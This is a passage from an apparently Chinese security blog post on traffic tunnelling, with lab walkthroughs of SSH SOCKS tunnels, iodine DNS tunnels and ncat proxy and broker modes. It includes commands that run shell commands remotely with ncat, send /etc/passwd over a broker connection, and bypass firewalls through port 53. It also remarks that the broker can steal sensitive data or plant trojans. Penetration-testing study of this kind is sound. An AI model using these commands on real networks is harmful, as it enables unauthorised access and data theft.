+<h3 id="linux-环境下的实操">1、linux 环境下的实操</h3>
+<ul>
+<li><strong>实验环境接上</strong></li>
+<li><strong>服务端操作</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9dd4137df.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402174158405-1479841307.png" /></p>
+<ul>
+<li><strong>客户端操作</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9dd9e7986.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402174329038-1368564819.png" /></p>
+<ul>
+<li><strong>以 ssh 登录 kali-2022 为例测试效果</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9df33f1cf.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402174637002-583358104.png" /></p>
+<ul>
+<li><strong>嵌套 ssh 隧道测试</strong></li>
+</ul>
+<p>ssh -CfNg -D 7001 root@10.0.0.1</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e0450d7d.png" /></p>
+<p>　　<strong>注</strong>，浏览器要设代理</p>
+<h3 id="windows-环境实操">2、Windows 环境实操</h3>
+<ul>
+<li><strong>以 win7 作为内网机为例</strong></li>
+<li><strong>配置IP及DNS等</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e254e997.png" /></p>
+<ul>
+<li><strong>测试</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e2b23850.png" /></p>
+<p><strong>建立隧道</strong></p>
+<ul>
+<li><strong>服务端【kali-2022】启动</strong></li>
+</ul>
+<p>iodined -f -c 10.0.0.1 test.lab.com</p>
+<ul>
+<li><strong>win7 操作【以管理员身份执行】</strong></li>
+</ul>
+<p>iodine.exe -f test.lab.com</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e3f7bbd0.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402215659690-95010808.png" /></p>
+<ul>
+<li><strong>测试效果</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e458df03.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e4f5f010.png" /></p>
+<ul>
+<li><strong>隧道嵌套测试【基于DNS隧道建立 ssh 隧道】</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e5e6caf3.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e7fd3adc.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e8731070.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9e948edd9.png" /></p>
+<p>　　<strong>注</strong>，7001是本地监听端口，浏览器等可借助该端口出网【原理是这样，但我自己测试时浏览器依旧访问不了百度，可能那个操作有误】。</p>
+<h2 id="十二隧道工具-ncat-介绍">十二、隧道工具 NCAT 介绍</h2>
+<ul>
+<li><strong>NCAT</strong></li>
+<li>被称为众多 NC 衍生版中最优的选择</li>
+<li>代理功能</li>
+<li>默认侦听端口：31337</li>
+<li>ncat -l 8080 --proxy-type http --proxy-auth user:passwd</li>
+<li>如果防火墙未限制 53 端口的出站访问，那么可以在公网放一台 linux
+机器，装上nmap（自带ncat），侦听 53 端口，可以代理内网机器访问外网资源
+ncat -l 53 --proxy-type http --proxy-auth
+user:passwd【实质和最前面提到的隧道一样】</li>
+<li><strong>broker 中介功能【推荐学习】</strong></li>
+<li>AC 不通，但AB、BC互通</li>
+<li>服务器：ncat -l 333 --broker</li>
+<li><strong>客户端和服务端之间发送的任何信息都会被发送/同步【类似于 hub
+功能】到其他建立连接的客户端【重点】</strong></li>
+<li>批量执行命令：ncat 1.1.1.1 --sh-exec “echo ‘pwd’”</li>
+<li>批量传文件：ncat --send-only 1.1.1.1 &lt; inputfile</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9ea04e9f1.png" /></p>
+<ul>
+<li><strong>应用场景</strong></li>
+<li>A 内网客户端</li>
+<li>B 服务端</li>
+<li>C 外网客户端</li>
+<li>A 无法直接访问 C（被防火墙隔离）</li>
+<li>B 位于 AC 之间，可以同时连接AC，可以用 B 作为中介跳转</li>
+<li>C 可以同时存在多个</li>
+<li>A  发往 B 的信息，B 会同时发送给与其连接的
+“C【客户端】”，除了发送命令，也可以传送文件。即可以获取敏感信息或写木马等。</li>
+</ul>
+<h3 id="ncat-代理演示">1、NCAT 代理演示</h3>
+<p>ncat -l 8080 --proxy-type http --proxy-auth user:passwd</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9ea04e9f1.png" /></p>
+<h3 id="broker-中介功能演示">2、broker 中介功能演示</h3>
+<ul>
+<li>B：ncat -l  4444  --broker</li>
+<li>C：ncat 127.0.0.1  4444</li>
+<li>A：ncat  127.0.0.1  4444 --sh-exec "echo <code>pwd</code>"</li>
+<li>注，IP地址根据所需替换，这里是在同一台机器演示故指为127.0.0.1</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9eba12b50.png" /></p>
+<ul>
+<li><p>发送文件</p>
+<p>ncat --send-only  127.0.0.1  4444 &lt; /etc/passwd</p></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9eba12b50.png" /></p>
+<p>未完待续……</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/" title="流量操控技术">https://z9m8r8.github.io/2023/04/03/流量操控技术/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/" rel="tag"><i class="fa fa-tag"></i> 远程控制</a>
+              <a href="/tags/%E5%90%8E%E9%97%A8/" rel="tag"><i class="fa fa-tag"></i> 后门</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 内网穿透</a>
+              <a href="/tags/%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93/" rel="tag"><i class="fa fa-tag"></i> 流量隧道</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/14/c-stl/" rel="prev" title="C++ STL">
+                  <i class="fa fa-angle-left"></i> C++ STL
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/20/%E7%BB%95%E8%BF%87-cdn-%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9Eip/" rel="next" title="绕过 CDN 获取真实IP">
+                  绕过 CDN 获取真实IP <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">167k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">10:07</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
